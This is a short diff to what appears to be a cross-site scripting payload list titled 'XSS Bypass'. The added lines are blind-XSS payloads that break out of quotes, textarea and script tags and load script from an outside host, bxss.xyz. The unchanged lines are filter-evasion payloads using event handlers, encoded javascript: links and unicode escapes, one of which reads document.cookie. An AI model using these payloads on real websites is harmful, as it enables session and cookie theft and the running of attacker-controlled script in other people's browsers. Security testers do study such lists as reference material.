@@ -2,6 +2,10 @@ XSS Bypass:
 
 <img src=1 only onerror=alert()>
 <svg%20oNinad=1%20onload=alert(document.cookie)>
+';"/></textarea></script><script/src=/bxss.xyz/></script>
+';"/></textarea></script><script/src=/bxss.xyz/
+';"/></script><script/src=/bxss.xyz/
+';"/><script/src=/bxss.xyz/
 <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
